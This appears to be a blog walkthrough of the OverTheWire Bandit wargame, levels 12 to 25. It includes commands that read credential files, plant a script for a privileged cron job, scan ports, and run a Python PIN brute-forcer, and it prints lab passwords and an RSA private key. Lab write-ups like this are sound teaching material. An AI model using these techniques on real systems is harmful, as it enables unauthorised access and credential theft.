+data3: bzip2 compressed data, block size = 900k
+</code></p>
+
+<p>You can also use <em>zcat</em> directly on the file without adding any extension:</p>
+
+<p><code>plain
+bandit12@melinda:/tmp/mystuff$ zcat newdata &gt; data3
+bandit12@melinda:/tmp/mystuff$ file data3
+data3: bzip2 compressed data, block size = 900k
+</code></p>
+
+<p>Since we know the program used to compress it, we use the same for the reverse:</p>
+
+<p><code>plain
+bandit12@melinda:/tmp/mystuff$ bzip2 -d data3
+bzip2: Can't guess original name for data3 -- using data3.out
+bandit12@melinda:/tmp/mystuff$ file data3.out
+data3.out: gzip compressed data, was "data4.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
+</code></p>
+
+<p>We&rsquo;ve been through this kind of decompression before:</p>
+
+<p><code>plain
+bandit12@melinda:/tmp/mystuff$ zcat data3.out &gt; data5
+bandit12@melinda:/tmp/mystuff$ file data5
+data5: POSIX tar archive (GNU)
+</code></p>
+
+<p>Next we have a tar archive and we will just loop decompressions until we&rsquo;re done:</p>
+
+<p><code>plain
+bandit12@melinda:/tmp/mystuff$ tar xvf data5
+data5.bin
+bandit12@melinda:/tmp/mystuff$ file data5.bin
+data5.bin: POSIX tar archive (GNU)
+bandit12@melinda:/tmp/mystuff$ tar xvf data5.bin
+data6.bin
+bandit12@melinda:/tmp/mystuff$ file data6.bin
+data6.bin: bzip2 compressed data, block size = 900k
+bandit12@melinda:/tmp/mystuff$ bzip2 -d data6.bin
+bzip2: Can't guess original name for data6.bin -- using data6.bin.out
+bandit12@melinda:/tmp/mystuff$ file data6.bin.out
+data6.bin.out: POSIX tar archive (GNU)
+bandit12@melinda:/tmp/mystuff$ tar xvf data6.bin.out
+data8.bin
+bandit12@melinda:/tmp/mystuff$ file data8.bin
+data8.bin: gzip compressed data, was "data9.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
+bandit12@melinda:/tmp/mystuff$ zcat data8.bin &gt; data9
+bandit12@melinda:/tmp/mystuff$ file data9
+data9: ASCII text
+bandit12@melinda:/tmp/mystuff$ cat data9
+The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+</code></p>
+
+<p>Finally! Had enough decompressions for one day.</p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>xxd &ndash; make a hexdump or do the reverse.</p>
+
+<p>-r | -revert</p>
+
+<p>reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it.</p>
+
+<p>mv &ndash; move (rename) files</p>
+
+<p>gzip &ndash; compress or expand files. Whenever possible, each file is replaced by one with the extension .gz. By default, gzip keeps the original file
+name and timestamp in the compressed  file. Compressed files can be restored to their original form using gzip -d  or gunzip or zcat.</p>
+
+<p>-d &mdash;decompress &mdash;uncompress
+Decompress.</p>
+
+<p>zcat uncompresses either a list of files on the command line or its standard input and writes the uncompressed data on standard output. zcat will
+uncompress files that have the correct magic number whether they have a .gz suffix or not.</p>
+
+<p>bzip2 &ndash; a block-sorting file compressor</p>
+
+<p>bzip2 expects a list of file names to accompany the command-line flags. Each  file is replaced by a compressed version of itself, with the name
+&ldquo;original_name.bz2&rdquo;.</p>
+
+<p>If  the  file does not end in one of the recognised endings, .bz2, .bz, .tbz2 or .tbz, bzip2 complains that it cannot guess the name  of the
+original file, and uses the original name with .out appended.</p>
+
+<p>-d &mdash;decompress
+Force  decompression.</p>
+
+<p>Tar stores and extracts files from a tape or disk archive.</p>
+
+<p>-x, &mdash;extract, &mdash;get
+extract files from an archive</p>
+
+<p>-v, &mdash;verbose
+verbosely list files processed</p>
+
+<p>-f, &mdash;file ARCHIVE
+use archive file or device ARCHIVE</p></blockquote>
+
+<h3>Level 13 &ndash;> Level 14</h3>
+
+<p>The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on</p>
+
+<p>Ok, we have a private key:</p>
+
+<p><code>plain
+bandit13@melinda:~$ ls
+sshkey.private
+bandit13@melinda:~$ file sshkey.private
+sshkey.private: PEM RSA private key
+</code></p>
+
+<p>The description hinted that we need to use the private key to SSH as bandit14 and read the password, and also mentioned localhost. So let&rsquo;s ssh to localhost:</p>
+
+<p><code>plain
+ssh bandit14@localhost -i /home/bandit13/sshkey.private
+bandit14@melinda:~$ cat /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>ssh — OpenSSH SSH client (remote login program)</p>
+
+<p>-i identity_file
+Selects a file from which the identity (private key) for public key authentication is read.</p></blockquote>
+
+<h3>Level 14 &ndash;> Level 15</h3>
+
+<p>The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.</p>
+
+<p>This level is straightforward since we have netcat available:</p>
+
+<p><code>plain
+bandit14@melinda:~$ nc -v localhost 30000
+Connection to localhost 30000 port [tcp/*] succeeded!
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+Correct!
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets.  It can open TCP connections,
+send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.</p></blockquote>
+
+<h3>Level 15 &ndash;> Level 16</h3>
+
+<p>The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.</p>
+
+<p>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -quiet and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…</p>
+
+<p>For this the <em>openssl</em> command line utility will come in handy:</p>
+
+<p>``` plain
+The openssl program is a command line tool for using the various cryptography functions of OpenSSL&rsquo;s crypto library from the shell. It can be used for</p>
+
+<pre><code>    o  Creation and management of private keys, public keys and parameters
+    o  Public key cryptographic operations
+    o  Creation of X.509 certificates, CSRs and CRLs
+    o  Calculation of Message Digests
+    o  Encryption and Decryption with Ciphers
+    o  SSL/TLS Client and Server Tests
+    o  Handling of S/MIME signed or encrypted mail
+    o  Time Stamp requests, generation and verification
+</code></pre>
+
+<p>```</p>
+
+<p>In particular, we will use the <code>s_client</code> command which is very useful for SSL servers testing and diagnostics. We use it to connect to localhost on the specified port:</p>
+
+<p>``` plain
+bandit15@melinda:~$ openssl s_client -quiet -connect localhost:30001
+depth=0 CN = li190-250.members.linode.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = li190-250.members.linode.com
+verify return:1
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+Correct!
+cluFn7wTiGryunymYOu4RcffSxQluehd</p>
+
+<p>read:errno=0
+```</p>
+
+<p>Without the <em>-quiet</em> flag we would get a ton of information and instead of the password we would see some HEARTBEATING and read R BLOCK messages</p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>openssl &ndash; OpenSSL command line tool</p>
+
+<p>s_client  This implements a generic SSL/TLS client which can establish a transparent connection to a remote server speaking SSL/TLS.
+It&rsquo;s intended for testing purposes only and provides only rudimentary interface functionality but internally uses
+mostly all functionality of the OpenSSL ssl library.</p>
+
+<p>-connect host:port
+This specifies the host and optional port to connect to. If not specified then an attempt is made to connect to the local host on port 4433</p>
+
+<p>-quiet
+inhibit printing of session and certificate information. This implicitly turns on -ign_eof as well.</p></blockquote>
+
+<p>More information (along with the CONNECTED COMMANDS section) can be found on <a href="https://openssl.org/docs/apps/s_client.html#options">https://openssl.org/docs/apps/s_client.html#options</a></p>
+
+<h3>Level 16 &ndash;> Level 17</h3>
+
+<p>The password for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.</p>
+
+<p>Fortunately, we have nmap installed, so scanning the port range is easy!</p>
+
+<p>``` plain
+bandit16@melinda:~$ nmap localhost -p31000-32000</p>
+
+<p>Starting Nmap 6.40 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-07-27 13:56 UTC
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00087s latency).
+Not shown: 996 closed ports
+PORT      STATE SERVICE
+31046/tcp open  unknown
+31518/tcp open  unknown
+31691/tcp open  unknown
+31790/tcp open  unknown
+31960/tcp open  unknown</p>
+
+<p>Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
+```</p>
+
+<p>Using netcat to probe all those ports, I found out that ports 31518 and 31790 use SSL from the following error:</p>
+
+<p><code>plain
+ERROR
+140737354045088:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:350:
+</code></p>
+
+<p>The rest of the ports just echo back what you send them. So now let&rsquo;s feed the password to these ports and see which one will give the answer:</p>
+
+<p><code>plain
+bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31518
+depth=0 CN = li190-250.members.linode.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = li190-250.members.linode.com
+verify return:1
+cluFn7wTiGryunymYOu4RcffSxQluehd
+cluFn7wTiGryunymYOu4RcffSxQluehd
+</code></p>
+
+<p>So, port 31518 just returns the string you give it. Must be the other one:</p>
+
+<p>``` plain
+bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31790
+depth=0 CN = li190-250.members.linode.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = li190-250.members.linode.com
+verify return:1
+cluFn7wTiGryunymYOu4RcffSxQluehd
+Correct!
+&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;</p>
+
+<p>read:errno=0
+```</p>
+
+<p>Instead of a password we got a SSH private key. I copied it in my <code>.ssh</code> folder, gave it right permissions to stop the WARNING: UNPROTECTED PRIVATE KEY FILE! message, and used it to log in as the next level and get the password:</p>
+
+<p><code>plain
+root@kali:~/.ssh# chmod 600 bandit17
+root@kali:~/.ssh# ssh -i ~/.ssh/bandit17 bandit17@bandit.labs.overthewire.org
+bandit17@melinda:~$ cat /etc/bandit_pass/bandit17
+xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>nmap &ndash; Network exploration tool and security / port scanner</p>
+
+<p>-p <port ranges>: Only scan specified ports
+Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</p></blockquote>
+
+<h3>Level 17 &ndash;> Level 18</h3>
+
+<p>There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new</p>
+
+<p>NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19</p>
+
+<p>We can use the <em>diff</em> program to see the differences between the 2 files:</p>
+
+<p>``` plain
+bandit17@melinda:~$ ls
+passwords.new  passwords.old
+bandit17@melinda:~$ diff passwords.old passwords.new
+42c42</p>
+
+<h2>&lt; BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR</h2>
+
+<blockquote><p>kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+```</p></blockquote>
+
+<p>The 42c42 string means that line 42 in the first file was changed to line 42 in the second. diff uses some characters to signify the kind of change that was found:</p>
+
+<p><code>plain
+a – line was added
+c – line was changed
+d – line was deleted
+</code></p>
+
+<p>The number to the left of the character represents the line number in the first file, while the one to the right refers to the line number of the second file. So the correct password is kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>diff &ndash; compare files line by line</p></blockquote>
+
+<h3>Level 18 &ndash;> Level 19</h3>
+
+<p>The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.</p>
+
+<p>Upon logging in, we are instantly disconnected and get a bye message:</p>
+
+<p><code>plain
+Byebye !
+Connection to bandit.labs.overthewire.org closed.
+</code></p>
+
+<p>The way to run a command immediately after logging in is to add it after the ssh command:</p>
+
+<p>``` plain
+root@kali:~/.ssh# ssh <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#98;&#97;&#110;&#x64;&#105;&#x74;&#49;&#x38;&#x40;&#98;&#97;&#x6e;&#x64;&#105;&#116;&#x2e;&#x6c;&#97;&#98;&#x73;&#x2e;&#111;&#118;&#x65;&#114;&#x74;&#104;&#101;&#119;&#105;&#x72;&#101;&#46;&#x6f;&#x72;&#103;">&#98;&#97;&#x6e;&#x64;&#105;&#x74;&#x31;&#x38;&#64;&#x62;&#97;&#x6e;&#x64;&#105;&#116;&#46;&#x6c;&#x61;&#x62;&#x73;&#46;&#x6f;&#x76;&#101;&#x72;&#116;&#x68;&#101;&#119;&#105;&#114;&#101;&#46;&#111;&#114;&#103;</a> cat readme
+This is the OverTheWire game server. More information on <a href="http://www.overthewire.org/wargames">http://www.overthewire.org/wargames</a></p>
+
+<p>Please note that wargame usernames are no longer level<X>, but wargamename<X>
+e.g. vortex4, semtex2, &hellip;</p>
+
+<p>Note: at this moment, blacksun is not available.</p>
+
+<p><a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#x62;&#97;&#x6e;&#100;&#x69;&#116;&#x31;&#x38;&#64;&#x62;&#97;&#x6e;&#100;&#x69;&#116;&#46;&#x6c;&#97;&#x62;&#x73;&#x2e;&#x6f;&#x76;&#x65;&#114;&#116;&#x68;&#101;&#119;&#x69;&#x72;&#101;&#x2e;&#111;&#114;&#x67;">&#x62;&#x61;&#110;&#x64;&#105;&#116;&#49;&#x38;&#x40;&#98;&#x61;&#110;&#x64;&#105;&#116;&#46;&#x6c;&#x61;&#x62;&#115;&#46;&#111;&#118;&#101;&#x72;&#x74;&#104;&#x65;&#x77;&#105;&#114;&#101;&#46;&#111;&#114;&#103;</a>&rsquo;s password:
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+```</p>
+
+<h3>Level 19 &ndash;> Level 20</h3>
+
+<p>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used to setuid binary.</p>
+
+<p><code>plain
+Run a command as another user.
+  Example: ./bandit20-do id
+bandit19@melinda:~$ ls -l bandit20-do
+-rwsr-x--- 1 bandit20 bandit19 7370 Nov 14  2014 bandit20-do
+</code></p>
+
+<p>The binary is a setuid binary owned by the bandit20 user, which means we can use it to directly read he password as if we were bandit20. No exploitation needed!</p>
+
+<p><code>plain
+bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+</code></p>
+
+<h3>Level 20 &ndash;> Level 21</h3>
+
+<p>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p>
+
+<p>NOTE: To beat this level, you need to login twice: once to run the setuid command, and once to start a network daemon to which the setuid will connect.</p>
+
+<p>NOTE 2: Try connecting to your own network daemon to see if it works as you think</p>
+
+<p>Here we will need to use 2 connections because we need to set up a listener as well. But since we have netcat, all is well! :D</p>
+
+<p><code>plain
+bandit20@melinda:~$ ./suconnect
+Usage: ./suconnect &lt;portnumber&gt;
+This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
+</code></p>
+
+<p>Have netcat listen on a port:</p>
+
+<p>``` plain
+bandit20@melinda:~$ nc -vnlp 7777
+Listening on [0.0.0.0] (family 0, port 7777)</p>
+
+<p>```</p>
+
+<p>Then use the setuid program to connect from a new shell to the netcat listener. We see on the netcat side the connection has been received and if we give it the password we will receive the next one:</p>
+
+<p><code>plain
+Connection from [127.0.0.1] port 7777 [tcp/*] accepted (family 2, sport 41986)
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+</code></p>
+
+<p>You can see on the other shell with the setuid binary that the password matched:</p>
+
+<p><code>plain
+bandit20@melinda:~$ ./suconnect 7777
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+</code></p>
+
+<h3>Level 21 &ndash;> Level 22</h3>
+
+<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
+
+<p>If we look in <code>/etc/cron.d/</code> we see a bunch of files, we are interested in the cronjob for bandit22:</p>
+
+<p><code>plain
+bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
+</code></p>
+
+<p>So cron runs a shell script as the bandit22 user. Let&rsquo;s see what it is:</p>
+
+<p>``` plain
+bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh</p>
+
+<h1>!/bin/bash</h1>
+
+<p>chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```</p>
+
+<p>So the bandit22 user decided to paste his password in a random named file in <em>/tmp/</em>, but he gave everyone the permission to read it!</p>
+
+<p><code>plain
+bandit21@melinda:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>cron &ndash; daemon to execute scheduled commands</p>
+
+<p>A crontab file contains instructions to the cron(8) daemon of the general form: &ldquo;run this command at this time on this date&rdquo;. Each user
+has their own crontab, and commands in any given crontab will be executed as the user who owns the crontab.</p>
+
+<p>The format of a cron command is very much the V7 standard, with a number of upward-compatible extensions. Each line has five time and
+date fields, followed by a command,  followed by a newline character (&lsquo;\n&rsquo;). The system crontab (/etc/crontab) uses the same format,
+except that the username for the command is specified after the time and date fields and before the command. The fields may be separated
+by spaces or tabs.</p>
+
+<p>Commands  are executed by cron(8) when the minute, hour, and month of year fields match the current time, and when at least one of the two
+day fields (day of month, or day of week) match the current time. cron(8) examines cron entries once every minute.</p>
+
+<p>A field may be an asterisk (*), which always stands for &ldquo;first-last&rdquo;.</p></blockquote>
+
+<h3>Level 22 &ndash;> Level 23</h3>
+
+<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
+
+<p>NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</p>
+
+<p>Again, we identify the cronjob file first to know where to look further:</p>
+
+<p><code>plain
+bandit22@melinda:/etc/cron.d$ cat cronjob_bandit23
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
+</code></p>
+
+<p>This script is more involved than the last:</p>
+
+<p>``` plain
+bandit22@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh</p>
+
+<h1>!/bin/bash</h1>
+
+<p>myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d &lsquo; &rsquo; -f 1)</p>
+
+<p>echo &ldquo;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&rdquo;</p>
+
+<p>cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```</p>
+
+<p>So, this script assigns the current user name to the myname variable. We know that&rsquo;s bandit22. And then copies the password to a file in <em>/tmp/</em> that we have to identify. We can do this by substitution:</p>
+
+<p>myname=bandit23 (that is what the <em>whoami</em> command will return)</p>
+
+<p>Then the string &ldquo;I m user bandit23&rdquo; is fed to md5sum to compute a MD5 hash. You can check the output on your system:</p>
+
+<p><code>plain
+root@kali:~# echo "I am user bandit23" | md5sum
+8ca319486bfbbc3663ea0fbe81326349  -
+</code></p>
+
+<p>The cut command is used to print just the hash line:</p>
+
+<p><code>plain
+root@kali:~# echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+</code></p>
+
+<p>Now we know that mytarget=8ca319486bfbbc3663ea0fbe81326349</p>
+
+<p><code>plain
+bandit22@melinda:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+</code></p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>whoami &ndash; Print the user name associated with the current effective user ID</p>
+
+<p>echo &ndash; display a line of text</p>
+
+<p> md5sum &ndash; compute and check MD5 message digest</p>
+
+<p>cut &ndash; remove sections from each line of files</p>
+
+<p>-d, &mdash;delimiter=DELIM
+use DELIM instead of TAB for field delimiter</p>
+
+<p>-f, &mdash;fields=LIST
+select only these fields;  also print any line that contains no delimiter character, unless the -s option is specified</p></blockquote>
+
+<h3>Level 23 &ndash;> Level 24</h3>
+
+<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
+
+<p>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>
+
+<p>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>
+
+<p>The beginning is the same as last levels:</p>
+
+<p>``` plain
+bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;> /dev/null
+bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh</p>
+
+<h1>!/bin/bash</h1>
+
+<p>myname=$(whoami)</p>
+
+<p>cd /var/spool/$myname
+echo &ldquo;Executing and deleting all scripts in /var/spool/$myname:&rdquo;
+for i in * .*;
+do</p>
+
+<pre><code>if [ "$i" != "." -a "$i" != ".." ];
+then
+echo "Handling $i"
+timeout -s 9 60 "./$i"
+rm -f "./$i"
+fi
+</code></pre>
+
+<p>done
+```</p>
+
+<p>So this script executes and then deletes all scripts in the /var/spool/bandit24 directory. We can place a script of our own in there to copy the password of the bandit24 user in a location we have access to. I made a directory in /tmp/ first:</p>
+
+<p><code>plain
+bandit23@melinda:/tmp$ mkdir stuff
+bandit23@melinda:/tmp$ cd stuff
+</code></p>
+
+<p>Then I made a file that will hold the password later and gave it the most liberal permissions possible:</p>
+
+<p><code>plain
+bandit23@melinda:/tmp/stuff$ touch readme.txt
+bandit23@melinda:/tmp/stuff$ chmod 777 readme.txt
+</code></p>
+
+<p>Next, I made a script that will be executed by cron. It just copies the bandit24 password to the file I&rsquo;ve created earlier.</p>
+
+<p>``` plain
+bandit23@melinda:/tmp/stuff$ cat > exeme.sh</p>
+
+<h1>!/bin/bash</h1>
+
+<p>cat /etc/bandit_pass/bandit24 > /tmp/stuff/readme.txt
+```</p>
+
+<p>I gave my script super permissive rights, then copied it to <em>/var/spool/bandit24</em> to be executed:</p>
+
+<p><code>plain
+bandit23@melinda:/tmp/stuff$ chmod 777 exeme.sh
+bandit23@melinda:/tmp/stuff$ cp exeme.sh /var/spool/bandit24/
+</code></p>
+
+<p>Waited a bit, then profit:</p>
+
+<p><code>plain
+bandit23@melinda:/tmp/stuff$ cat readme.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+</code></p>
+
+<h3>Level 24 &ndash;> Level 25</h3>
+
+<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinaties, called brute-forcing.</p>
+
+<p><code>plain
+bandit24@melinda:~$ nc -vv localhost 30002
+Connection to localhost 30002 port [tcp/*] succeeded!
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+</code></p>
+
+<p>Meh, this means we&rsquo;ll have to bruteforce the pincode and try until the daemon says it&rsquo;s correct. I wrote a quick Python script for that:</p>
+
+<p>``` python</p>
+
+<h1>!/usr/bin/python</h1>
+
+<p>import itertools
+import socket</p>
+
+<p>PIN_CHARS = &lsquo;0123456789&rsquo; # digits that can be in a pin
+PIN_LEN = 4 # pin length</p>
+
+<p>wrong = &lsquo;Wrong!&rsquo; # part of the msg received for wrong data
+fail = &lsquo;Fail!&rsquo; # msg received if data doesn&rsquo;t respect constraints
+normal = &lsquo;I am the pincode checker&rsquo; # normal msg
+host = &lsquo;127.0.0.1&rsquo;
+port = 30002</p>
+
+<p>def computePins(iterables, r):</p>
+
+<pre><code>"""
+Build a list of all possible pin combinations that meet the constraints
+"""
+pins = []
+for pin in itertools.product(iterables, repeat = r):
+    pins.append(''.join(pin))
+return pins
+</code></pre>
+
+<p>pinlist = computePins(PIN_CHARS, PIN_LEN)</p>
+
+<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, int(port)))</p>
+
+<p>for pin in pinlist:</p>
+
+<pre><code>msg = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ %s\n' % pin
+reply = s.recv(1024)
+s.send(msg)
+if wrong not in reply and fail not in reply and normal not in reply:
+    print msg, reply
+    break
+</code></pre>
+
+<p>```</p>
+
+<p>And running it:</p>
+
+<p><code>plain
+bandit24@melinda:/tmp/b24mine$ ./bandit24.py
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5670
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+</code></p>
+
+<h3>Level 25 &ndash;> Level 26</h3>
+
+<p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.</p>
+
+<p>After logging in I found a SSH private key for level 26 just lying around:</p>
+
+<p><code>plain
+bandit25@melinda:~$ ls
+bandit26.sshkey
+</code></p>
+
+<p>But when using it to log in, the connection closes immediately, after showing this:</p>
+
+<p>``` plain</p>
+
+<hr />
+
+<p> | |                   | (<em>) | |<strong> \ / /<br/>
+ | |</strong>   <strong> _ _ </strong>   __| |</em>| |<em>   ) / /</em><br/>
+ | &lsquo;<em> \ / </em><code>| '_ \ / _</code> | | <strong>| / / &rsquo;<em> \
+ | |</em>) | (<em>| | | | | (</em>| | | |<em> / /| (</em>) |
+ |_.</strong>/ _<em>,</em>|<em>| |</em>|_<em>,</em>|<em>|_</em>|<strong>___</strong>/
+Connection to bandit.labs.overthewire.org closed.
+```</p>
+
